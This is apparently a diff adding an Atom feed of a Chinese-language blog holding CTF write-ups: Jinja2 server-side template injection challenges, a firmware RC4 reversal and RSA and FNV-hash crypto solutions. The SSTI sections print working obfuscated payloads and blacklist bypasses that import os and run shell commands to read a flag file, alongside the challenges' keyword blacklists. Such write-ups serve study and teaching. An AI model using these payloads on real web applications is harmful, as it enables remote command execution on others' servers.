@@ -1,0 +1,1835 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://yzs17.github.io</id>
+    <title>XU17</title>
+    <updated>2024-12-19T16:40:52.366Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://yzs17.github.io"/>
+    <link rel="self" href="https://yzs17.github.io/atom.xml"/>
+    <subtitle>Follow the light but walk on the darkest path</subtitle>
+    <logo>https://yzs17.github.io/images/avatar.png</logo>
+    <icon>https://yzs17.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, XU17</rights>
+    <entry>
+        <title type="html"><![CDATA[SSTI-fenjing-思路总结]]></title>
+        <id>https://yzs17.github.io/post/ssti-fenjing-si-lu-zong-jie/</id>
+        <link href="https://yzs17.github.io/post/ssti-fenjing-si-lu-zong-jie/">
+        </link>
+        <updated>2024-12-19T16:31:35.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="2024-pwnsecctf-jinjia2-master">2024-pwnsecCTF-jinjia2 master</h3>
+<ul>
+<li>SSTI模版注入，app.py源码如下</li>
+</ul>
+<pre><code class="language-Python">from flask import Flask, request, render_template_string
+import html
+
+app = Flask(__name__)
+
+BLACKLIST = [
+    'init','globals','builtins','import','os','popen','read','request','application','TemplateReference',
+    'cycler','joiner','namespace','lipsum','getitem','config','for','eval','flashed','range','class','mro',
+    'subclasses','pyfile','shell','stdout','base','if','module','RUNCMD','format','args','values','form',
+    'cookies','headers','pragma','mimetype','origin','referrer','pop','attr','chr','free','palestine','with'
+]
+
+BLACKLIST += ['0','1','2','3','4','5','6','7','8','9']
+
+BLACKLIST += [&quot;'&quot;,'&quot;',&quot;`&quot;,'\\','/','.','_','[',']','{{','}}','#']
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def home():
+    c = request.form.get('c') if request.method == 'POST' else None
+    error_message = None
+    rendered_template = None
+    
+    if c:
+        c = c.lower()
+        for item in BLACKLIST:
+            if item in c:
+                error_message = &quot;Invalid input detected!&quot;
+                break
+        else:
+            rendered_template = html.unescape(render_template_string(c))
+            # can you?
+            if &quot;fr3e_p4le$t1ne&amp;!&quot; in rendered_template:
+                try:
+                    with open('flag.txt', 'r') as flag_file:
+                        flag = flag_file.read()
+                    return f&quot;Flag: {flag}&quot;
+                except FileNotFoundError:
+                    return &quot;Flag file not found!&quot;
+
+    return '''
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Jinja-Master&lt;/title&gt;
+    &lt;style&gt;
+        @import url('https://fonts.googleapis.com/css2?family=VT323&amp;display=swap');
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('/static/image.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'VT323', monospace;
+            color: #33FF33;
+        }
+
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px 5px rgba(0, 255, 0, 0.5);
+            max-width: 400px; 
+            width: 100%; 
+        }
+
+        .form-container input[type=&quot;text&quot;] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #33FF33;
+            border-radius: 5px;
+            background-color: #000;
+            color: #33FF33;
+            font-size: 18px;
+            box-sizing: border-box; 
+        }
+
+        .form-container input[type=&quot;submit&quot;] {
+            width: 100%;
+            padding: 10px;
+            background-color: #33FF33;
+            border: none;
+            border-radius: 5px;
+            color: #000;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-sizing: border-box; 
+        }
+
+        .form-container input[type=&quot;submit&quot;]:hover {
+            background-color: #00FF00;
+        }
+
+        .result, .error {
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid #33FF33;
+            border-radius: 5px;
+            background-color: #000;
+            color: #33FF33;
+            font-size: 18px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;form-container&quot;&gt;
+        &lt;form method=&quot;post&quot;&gt;
+            Enter template string: &lt;input type=&quot;text&quot; name=&quot;c&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+        &lt;/form&gt;
+        
+        
+        &lt;div class=&quot;result&quot;&gt;{{ rendered_template }}{{ error_message }}&lt;/div&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+    '''.replace(&quot;{{ error_message }}&quot;, error_message or &quot;&quot;).replace(&quot;{{ rendered_template }}&quot;, rendered_template or &quot;&quot;)
+</code></pre>
+<ul>
+<li>题目无回显，需要修改源码，本地调试</li>
+</ul>
+<pre><code class="language-Python">.replace(&quot;{{ rendered_template }}&quot;, rendered_template or &quot;&quot;).replace(&quot;{% if error_message %}&quot;, error_message and (&quot;&lt;div class='error'&gt;&quot; + error_message + &quot;&lt;/div&gt;&quot;) or &quot;&quot;)
+</code></pre>
+<pre><code>python -m flask run --host=0.0.0.0 --port=1520
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200027251.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>fenjing一把嗦</li>
+</ul>
+<pre><code>python -m fenjing scan --url &quot;http://127.0.0.1:1520&quot; --extra-data &quot;c=1&quot;
+</code></pre>
+<p><strong>payload</strong></p>
+<pre><code class="language-Python">c={%set at=dict(rtta=x)|first|reverse%}{%set xq=dict(so=x)|first|reverse%}{%set re=dict(daer=x)|first|reverse%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set yd=dict(a=x,b=x,c=x)|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set in=dict(tini=x)|first|reverse%}{%set ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+in+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set gl=dict(slabolg=x)|first|reverse%}{%set go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set ge=dict(metiteg=x)|first|reverse%}{%set gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set bu=dict(snitliub=x)|first|reverse%}{%set bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set im=dict(tropmi=x)|first|reverse%}{%set ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set yt=dict(aaaaa=x)|first|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set pw=yd+la%}{%set iw={}|escape|list|escape|count%}{%set et=iw+lla%}{%set po=(({}|escape|urlencode|first+dict(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%}{%set ls=(({}|escape|urlencode|first+dict(c=x)|join)*(yd+la))%(sbb+et+lla+pw,llla+pw,iw+bb,et+bb+pw)%}{%print (((((((((((x,)|map(at,ii)|first,)|map(at,go)|first,)|map(at,gi)|first)(bl),)|map(at,gi)|first)(ip))(xq),)|map(at,po)|first)(ls),)|map(at,re)|first)()%}
+</code></pre>
+<pre><code>cat flag.txt
+</code></pre>
+<pre><code>c={%set at=dict(rtta=x)|first|reverse%}{%set xq=dict(so=x)|first|reverse%}{%set re=dict(daer=x)|first|reverse%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set yd=dict(a=x,b=x,c=x)|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set in=dict(tini=x)|first|reverse%}{%set ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+in+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set gl=dict(slabolg=x)|first|reverse%}{%set go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set ge=dict(metiteg=x)|first|reverse%}{%set gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set bu=dict(snitliub=x)|first|reverse%}{%set bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set im=dict(tropmi=x)|first|reverse%}{%set ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set yt=dict(aaaaa=x)|first|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set pw=yd+la%}{%set iw={}|escape|list|escape|count%}{%set et=iw+lla%}{%set po=(({}|escape|urlencode|first+dict(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%}{%set cf=(({}|escape|urlencode|first+dict(c=x)|join)*(lla+la))%(sbb+et+bb,sbb+et+pw,llla+yt,iw+bb,sbb+et+bb+yd,sbb+et+lla+pw,sbb+et+pw,sbb+et+bb+pw,et+bb+yd,llla+yt,llla+bb+yd,llla+yt)%}{%print (((((((((((x,)|map(at,ii)|first,)|map(at,go)|first,)|map(at,gi)|first)(bl),)|map(at,gi)|first)(ip))(xq),)|map(at,po)|first)(cf),)|map(at,re)|first)()%}
+</code></pre>
+<ul>
+<li>成功获得本地demo的flag</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200022125.png" alt="image-20241220002258598" loading="lazy"></figure>
+<h3 id="2024-ccb-safe_proxy">2024-CCB-Safe_proxy</h3>
+<p>访问页面，得到源码如下</p>
+<pre><code class="language-Python">from flask import Flask, request, render_template_string
+import socket
+import threading
+import html
+
+app = Flask(__name__)
+
+@app.route('/', methods=[&quot;GET&quot;])
+def source():
+    with open(__file__, 'r', encoding='utf-8') as f:
+        return '&lt;pre&gt;'+html.escape(f.read())+'&lt;/pre&gt;'
+
+@app.route('/', methods=[&quot;POST&quot;])
+def template():
+    template_code = request.form.get(&quot;code&quot;)
+    # 安全过滤
+    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
+    for black in blacklist:
+        if black in template_code:
+            return &quot;Forbidden content detected!&quot;
+    result = render_template_string(template_code)
+    print(result)
+    return 'ok' if result is not None else 'error'
+
+class HTTPProxyHandler:
+    def __init__(self, target_host, target_port):
+        self.target_host = target_host
+        self.target_port = target_port
+
+    def handle_request(self, client_socket):
+        try:
+            request_data = b&quot;&quot;
+            while True:
+                chunk = client_socket.recv(4096)
+                request_data += chunk
+                if len(chunk) &lt; 4096:
+                    break
+
+            if not request_data:
+                client_socket.close()
+                return
+
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
+                proxy_socket.connect((self.target_host, self.target_port))
+                proxy_socket.sendall(request_data)
+
+                response_data = b&quot;&quot;
+                while True:
+                    chunk = proxy_socket.recv(4096)
+                    if not chunk:
+                        break
+                    response_data += chunk
+
+            header_end = response_data.rfind(b&quot;\r\n\r\n&quot;)
+            if header_end != -1:
+                body = response_data[header_end + 4:]
+            else:
+                body = response_data
+                
+            response_body = body
+            response = b&quot;HTTP/1.1 200 OK\r\n&quot; \
+                       b&quot;Content-Length: &quot; + str(len(response_body)).encode() + b&quot;\r\n&quot; \
+                       b&quot;Content-Type: text/html; charset=utf-8\r\n&quot; \
+                       b&quot;\r\n&quot; + response_body
+
+            client_socket.sendall(response)
+        except Exception as e:
+            print(f&quot;Proxy Error: {e}&quot;)
+        finally:
+            client_socket.close()
+
+def start_proxy_server(host, port, target_host, target_port):
+    proxy_handler = HTTPProxyHandler(target_host, target_port)
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(100)
+    print(f&quot;Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...&quot;)
+
+    try:
+        while True:
+            client_socket, addr = server_socket.accept()
+            print(f&quot;Connection from {addr}&quot;)
+            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
+            thread.daemon = True
+            thread.start()
+    except KeyboardInterrupt:
+        print(&quot;Shutting down proxy server...&quot;)
+    finally:
+        server_socket.close()
+
+def run_flask_app():
+    app.run(debug=False, host='127.0.0.1', port=5000)
+
+if __name__ == &quot;__main__&quot;:
+    proxy_host = &quot;0.0.0.0&quot;
+    proxy_port = 5001
+    target_host = &quot;127.0.0.1&quot;
+    target_port = 5000
+
+    # 安全反代，防止针对响应头的攻击
+    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
+    proxy_thread.daemon = True
+    proxy_thread.start()
+
+    print(&quot;Starting Flask app...&quot;)
+    run_flask_app()
+</code></pre>
+<ul>
+<li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li>
+<li>把<code>flag</code>重定向到<code>app.py</code>上</li>
+<li>绕过<code>blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']</code></li>
+<li><code>__ -&gt; '_'+'_'</code></li>
+<li><code>os -&gt; 'o'+'s'</code></li>
+</ul>
+<p>最终<code>payload</code>如下</p>
+<pre><code class="language-Python">code={%set a='_'+'_'+'globals'+'_'+'_'%}{%set b='_'+'_'+'builtins'+'_'+'_'%}{%set c='_'+'_'+'impo''rt'+'_'+'_'%}{%set d='o'+'s'%}{{cycler.next[a][b][c](d)['pop''en']('cat ../../../flag &gt; app.py').read()}}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029756.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>回退</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029730.png" alt="img" loading="lazy"></figure>
+<p><strong>后续研究</strong></p>
+<p>其实可以fenjing一把嗦，但是需要修改一下代码，改成有回显的。</p>
+<figure data-type="image" tabindex="5"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029578.png" alt="40a93733048c34b153835a040397d5d" loading="lazy"></figure>
+<pre><code>python -m fenjing scan --url &quot;http://127.0.0.1:5000&quot; --extra-data &quot;code=1&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029651.png" alt="e55316d39cd823a891b32f1b9aad922" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2024-CISCN-XU17]]></title>
+        <id>https://yzs17.github.io/post/2024ciscn-xu17/</id>
+        <link href="https://yzs17.github.io/post/2024ciscn-xu17/">
+        </link>
+        <updated>2024-12-15T23:51:40.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web">Web</h2>
+<h3 id="safe_proxy">Safe_proxy</h3>
+<p><mark>访问页面，得到源码如下</mark></p>
+<pre><code class="language-Python">from flask import Flask, request, render_template_string
+import socket
+import threading
+import html
+
+app = Flask(__name__)
+
+@app.route('/', methods=[&quot;GET&quot;])
+def source():
+    with open(__file__, 'r', encoding='utf-8') as f:
+        return '&lt;pre&gt;'+html.escape(f.read())+'&lt;/pre&gt;'
+
+@app.route('/', methods=[&quot;POST&quot;])
+def template():
+    template_code = request.form.get(&quot;code&quot;)
+    # 安全过滤
+    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
+    for black in blacklist:
+        if black in template_code:
+            return &quot;Forbidden content detected!&quot;
+    result = render_template_string(template_code)
+    print(result)
+    return 'ok' if result is not None else 'error'
+
+class HTTPProxyHandler:
+    def __init__(self, target_host, target_port):
+        self.target_host = target_host
+        self.target_port = target_port
+
+    def handle_request(self, client_socket):
+        try:
+            request_data = b&quot;&quot;
+            while True:
+                chunk = client_socket.recv(4096)
+                request_data += chunk
+                if len(chunk) &lt; 4096:
+                    break
+
+            if not request_data:
+                client_socket.close()
+                return
+
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
+                proxy_socket.connect((self.target_host, self.target_port))
+                proxy_socket.sendall(request_data)
+
+                response_data = b&quot;&quot;
+                while True:
+                    chunk = proxy_socket.recv(4096)
+                    if not chunk:
+                        break
+                    response_data += chunk
+
+            header_end = response_data.rfind(b&quot;\r\n\r\n&quot;)
+            if header_end != -1:
+                body = response_data[header_end + 4:]
+            else:
+                body = response_data
+                
+            response_body = body
+            response = b&quot;HTTP/1.1 200 OK\r\n&quot; \
+                       b&quot;Content-Length: &quot; + str(len(response_body)).encode() + b&quot;\r\n&quot; \
+                       b&quot;Content-Type: text/html; charset=utf-8\r\n&quot; \
+                       b&quot;\r\n&quot; + response_body
+
+            client_socket.sendall(response)
+        except Exception as e:
+            print(f&quot;Proxy Error: {e}&quot;)
+        finally:
+            client_socket.close()
+
+def start_proxy_server(host, port, target_host, target_port):
+    proxy_handler = HTTPProxyHandler(target_host, target_port)
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(100)
+    print(f&quot;Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...&quot;)
+
+    try:
+        while True:
+            client_socket, addr = server_socket.accept()
+            print(f&quot;Connection from {addr}&quot;)
+            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
+            thread.daemon = True
+            thread.start()
+    except KeyboardInterrupt:
+        print(&quot;Shutting down proxy server...&quot;)
+    finally:
+        server_socket.close()
+
+def run_flask_app():
+    app.run(debug=False, host='127.0.0.1', port=5000)
+
+if __name__ == &quot;__main__&quot;:
+    proxy_host = &quot;0.0.0.0&quot;
+    proxy_port = 5001
+    target_host = &quot;127.0.0.1&quot;
+    target_port = 5000
+
+    # 安全反代，防止针对响应头的攻击
+    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
+    proxy_thread.daemon = True
+    proxy_thread.start()
+
+    print(&quot;Starting Flask app...&quot;)
+    run_flask_app()
+</code></pre>
+<ul>
+<li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li>
+<li>把<code>flag</code>重定向到<code>app.py</code>上</li>
+<li>绕过<code>blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']</code></li>
+<li><code>__ -&gt; '_'+'_'</code></li>
+<li><code>os -&gt; 'o'+'s'</code></li>
+</ul>
+<p>最终<code>payload</code>如下</p>
+<pre><code class="language-Python">code={%set a='_'+'_'+'globals'+'_'+'_'%}{%set b='_'+'_'+'builtins'+'_'+'_'%}{%set c='_'+'_'+'impo''rt'+'_'+'_'%}{%set d='o'+'s'%}{{cycler.next[a][b][c](d)['pop''en']('cat ../../../flag &gt; app.py').read()}}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005154.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>回退</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162016073.png" alt="img" loading="lazy"></figure>
+<h2 id="reverse">Reverse</h2>
+<h3 id="ezcsky">ezCsky</h3>
+<ul>
+<li>固件分析，<code>Motorola RCE</code>架构，<code>ida7.7</code>里没有对应的<code>type</code>，一个个试找了一个反编译效果最好的</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005009.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>能识别出来的函数只有几个</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005972.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>
+<p>但是去翻翻看，能看到一个rc4_encrypt,cmp_result,main,大概能猜到意思</p>
+</li>
+<li>
+<p>在main里翻到了几个特征串，大概理清了流程</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005919.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>
+<p>用<code>“testkey”</code>进行<code>rc4</code>加密，在<code>cmp</code>中进行比较，密文在<code>unk_8AA0</code>里，往下面翻翻就能看到</p>
+</li>
+<li>
+<p>去网站解密后，发现还不太对</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005966.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>发现最后一个是}，考虑还有个<code>xor</code>没用上，猜测是一个前后异或，回去读一读，大概对的上</li>
+</ul>
+<figure data-type="image" tabindex="7"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005016.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">flag{d0f5b330-9a74-11ef-9afd-acde48001122}
+</code></pre>
+<h2 id="crypto">Crypto</h2>
+<h3 id="rasnd">rasnd</h3>
+<ul>
+<li>第一部分 分析代码，得到如下关系</li>
+</ul>
+<pre><code>h1 = x1*p + y1 *q - 0x114
+h2 = x2*p +y2 * q - 0x514
+</code></pre>
+<ul>
+<li>消去<code>p</code>后，只需要爆破<code>h1、h2</code>即可</li>
+</ul>
+<pre><code class="language-Python">from Crypto.Util.number import *
+from gmpy2 import *
+from tqdm import *
+c = 2047025302632489558157986377411562383750242098507101091835107604805413439963651499324666753537268662411798999353368521616537455619541474396664247770819403320179057671372599818892198417715189001567277409117783983748271235004737860935969497729693964275961990646245389724322432112287310417469924363937852078540410479502868130356098508588355727424707732912060661787647639381326829675883881765220953147603356174168805562685038102366234920340464587909256209275021059297167327887262581448148603906439400710107536951684459877024176259067449629350804430963362618693698322831473282809815790044861282591070783004510688686543536
+n = 15920173700664937533872551211373259839660299468835236200963406447246081490116425338346880175793432609104986652164487679573546435542663593978091836423227699351391038307254973165725055211012599604697598457965776845260944492561088472287304875941686160337835563398666657256280956343977084300347919352519507817390748959649985567022862236579500096654959197540691900743410585789944175259198342315278161373891512170975014764014690048430767176042774918769605948250968099683007673337011895410534198101814351729062810555709406291719644174553645729624040667677828580430395394166441608908794433481917739937056295583112550096842829
+a = 1788191443423648314996962441836187430188972565635381393376017463408135062887872327752852694837772510240051857039862516257168171180534813011888460306819202855254313812259002208708003315009272616637706145101210351906671428324238878097469011217517290793242097541951393761641647697870262022422080159421238248852236227711616142536087708611893231058
+b = 4889435575009813953150459835380031496142967222940678447969658749487294768373783678917852904447599308535099664667524504039245726024439182695980458708722618855136931457891616586649484629257141009693449457099695131583806787115459724479919725740229105715779481332474441933271505987533267210176224331187382523048267185202782555789943574792505715301119230102640163860970042097004807825585559573355461122118412971402964101893600100934904032951444699944229492743037419616
+e = 0x10001
+
+for x1 in range(2**8,2**11):
+    for x2 in range(2**8,2**11):
+        k = (b+0x514)*x1 - (a+0x114)*x2
+        
+        if(gcd(k,n) &gt;1 &amp; gcd(k,n)&lt;n-1):
+            print(gcd(k,n))
+            q = gcd(k,n)
+
+q = 129713873839145334329392401371189963777712190897978816709235924556672196006347844671068464026219117804812297989197327919408459177096469030481019240080779880761097280806029355911233146512712582901895037850147815390703479188070631638892905175053709386715345561960074809966193484477155806599143328718289066817237
+p = n//q
+print(p)
+print(p*q ==n)
+
+phi = (p-1)*(q-1)
+print(phi)
+d = invert(e,phi)
+m= pow(c,d,n)
+print(long_to_bytes(m))
+</code></pre>
+<ul>
+<li>第二部分
+<ul>
+<li>分析得到：</li>
+</ul>
+</li>
+</ul>
+<pre><code>h = pow(514`*`p - 114`*`q, n - p - q, n) 
+</code></pre>
+<ul>
+<li>
+<p>由<code>pow(a,phi,n) = 1(a、n互素)</code>得<code>h = pow(514</code><em><code>p-114</code></em><code>q , -1 , n)</code></p>
+</li>
+<li>
+<p>求逆元，求出<code>514</code><em><code>p-114</code></em><code>q</code>后联立<code>n = p *q</code> 即可</p>
+</li>
+</ul>
+<pre><code class="language-Python">def extended_gcd(a, b):
+    if a == 0:
+        return b, 0, 1
+    gcd, x1, y1 = extended_gcd(b % a, a)
+    x = y1 - (b // a) * x1
+    y = x1
+    return gcd, x, y
+
+def mod_inverse(h, n):
+    gcd, a, _ = extended_gcd(h, n)
+    if gcd != 1:
+        raise ValueError(f&quot;{h} 和 {n} 不是互质的，无法计算逆元。&quot;)
+    else:
+        return a % n  
+
+
+h =   # 替换为实际的 h 值
+n =   # 替换为实际的 n 值
+
+try:
+    a = mod_inverse(h, n)
+    print(f&quot;满足 a * {h} ≡ 1 (mod {n}) 的 a 值为: {a}&quot;)
+except ValueError as e:
+    print(e)
+n =   # 替换为实际的 n 值
+h =   # 替换为实际的 h 值
+
+# 定义符号 p 和 q
+p, q = var('p q')
+
+eq1 = h == 514 * p - 114 * q
+eq2 = n == p * q
+
+solution = solve([eq1, eq2], p, q)
+
+solution
+from Crypto.Util.number import *
+from gmpy2 import *
+
+c = 
+n = 
+p = 
+q = 
+e = 0x10001
+phi = (p-1)*(q-1)
+print(phi)
+d = invert(e,phi)
+m= pow(c,d,n)
+print(long_to_bytes(m))
+</code></pre>
+<ul>
+<li>Flag:</li>
+</ul>
+<pre><code>flag{1b50dd42-e130-4aa1-af32-f0c228139ba9}
+</code></pre>
+<h3 id="fffffhash">Fffffhash</h3>
+<ul>
+<li>分析题目，一开始想构造格然后应用LLL求解，但一直没构造出来，然后写了个爆破的代码但要跑很久，最后搜索发现本题实际上是fnv算法的应用，去网上找了模板稍微改改，很快就写出来了</li>
+</ul>
+<pre><code class="language-Python">TARGET = 201431453607244229943761366749810895688
+h0 = 0x6c62272e07bb014262b821756295c58d
+p = 0x0000000001000000000000000000013b
+MOD = 2^128
+
+n = 16
+M = Matrix.column([p^(n - i - 1) for i in range(n)] + [-(TARGET - h0*p^n), MOD])
+M = M.augment(identity_matrix(n+1).stack(vector([0] * (n+1))))
+Q = Matrix.diagonal([2^256] + [2^4] * n + [2^8])
+M *= Q
+M = M.BKZ()
+M /= Q
+for r in M:
+    if r[0] == 0 and abs(r[-1]) == 1:
+        r *= r[-1]
+        #print(r)
+        good = r[1:-1]
+        print(good)
+        break
+
+inp = []
+y = int(h0*p)
+t = (h0*p^n + good[0] * p^(n-1)) % MOD
+for i in range(n):
+    for x in range(256):
+        y_ = (int(y) ^^ int(x)) * p^(n-i-1) % MOD
+        if y_ == t:
+            print('good', i, x)
+            inp.append(x)
+            if i &lt; n-1:
+                t = (t + good[i+1] * p^(n-i-2)) % MOD
+                y = ((int(y) ^^ int(x)) * p) % MOD
+            break
+    else:
+        print('bad', i)
+print(bytes(inp).hex())
+#020101081b04390001051a020a3d0f0f
+</code></pre>
+<ul>
+<li>不断调整n的取值，在n为16、23、29等时可以得到正解</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005522.png" alt="img" loading="lazy"></figure>
+<h2 id="威胁检测与恶意分析">威胁检测与恶意分析</h2>
+<h3 id="zeroshell_1">Zeroshell_1</h3>
